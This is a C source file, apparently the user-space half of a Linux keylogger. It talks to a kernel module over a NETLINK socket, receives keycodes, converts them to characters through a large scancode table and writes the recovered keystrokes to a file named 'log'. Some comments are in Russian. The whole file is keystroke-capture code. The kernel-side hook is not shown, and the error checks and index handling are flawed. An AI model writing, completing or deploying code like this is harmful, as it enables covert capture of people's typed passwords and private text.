#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <linux/netlink.h>
#include <unistd.h>
 
#define NETLINK_TEST 30
#define MSG_LEN 125
#define MAX_PLOAD 125

const char *mass_of_key[][2] = { {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"}, 
{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, 
{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"}, 
{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"}, 
{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"}, 
{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"}, 
{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, 
{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"}, 
{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, 
{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"}, 
{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, 
{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, 
{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, 
{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"}, {"_LALT_", "_LALT_"}, 
{" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"}, {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, 
{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, 
{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, 
{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, 
{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"}, 
{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"}, 
{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 
{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, 
{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"}, {"_PRTSCR_", "_PRTSCR_"}, 
{"_RALT_", "_RALT_"}, {"\0", "\0"}, 
{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"}, 
{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"}, {"_DOWN_", "_DOWN_"}, 
{"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, 
{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, 
{"_PAUSE_", "_PAUSE_"},};

typedef struct _user_msg_info
{
    struct nlmsghdr hdr;
    int  msg[MSG_LEN];
} user_msg_info;
 
int main(int argc, char **argv)
{
    int skfd = 0;
    int ret = 0;
    char *key = NULL;
    user_msg_info u_info;
    socklen_t len;
    struct nlmsghdr *nlh = NULL;
    struct sockaddr_nl saddr, daddr;
    char *umsg = "hello netlink!!";
    
         /* Создание сокета NETLINK */
    skfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_TEST);
    if(skfd == -1)
    {
        perror("create socket error\n");
        return -1;
    }
 
    memset(&saddr, 0, sizeof(saddr));
    saddr.nl_family = AF_NETLINK; //AF_NETLINK
    saddr.nl_pid = 100; // номер порта (ID порта) 
    saddr.nl_groups = 0;
    if(bind(skfd, (struct sockaddr *)&saddr, sizeof(saddr)) != 0)
    {
        perror("bind() error\n");
        close(skfd);
        return -1;
    }
 
    memset(&daddr, 0, sizeof(daddr));
    daddr.nl_family = AF_NETLINK;
    daddr.nl_pid = 0; // to kernel 
    daddr.nl_groups = 0;
 
    nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PLOAD));
    memset(nlh, 0, sizeof(struct nlmsghdr));
    nlh->nlmsg_len = NLMSG_SPACE(MAX_PLOAD);
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_type = 0;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = saddr.nl_pid; //self port
 
    memcpy(NLMSG_DATA(nlh), umsg, strlen(umsg));
    ret = sendto(skfd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&daddr, sizeof(struct sockaddr_nl));
    if(!ret)
    {
        perror("sendto error\n");
        close(skfd);
        return -1;
    }
    printf("send kernel:%s\n", umsg);
 
    memset(&u_info, 0, sizeof(u_info));
    len = sizeof(struct sockaddr_nl);
    
    ret = recvfrom(skfd, &u_info, sizeof(user_msg_info), 0, (struct sockaddr *)&daddr, &len);
    if(!ret)
    {
        perror("recv form kernel error\n");
        close(skfd);
        return -1;
    }

    FILE *fp = NULL;
    if ((fp = fopen("log", "w+")) == NULL){
        perror("File not open");
        return -1;
    }

    int i = 0;
    while(u_info.msg[i] != -1){
        if (u_info.msg[i] < 1000){
            printf("from kernel:%s\n", mass_of_key[u_info.msg[i]][0]);
            key = mass_of_key[u_info.msg[i]][0];
        }
        else{
            printf("from kernel:%s\n", mass_of_key[u_info.msg[i]-1000][1]);
            key = mass_of_key[u_info.msg[i]-1000][1];
        }
        fwrite(key, strlen(key), 1, fp);
        i++;
    }
    
    close(skfd);
 
    free((void *)nlh);
    return 0;
}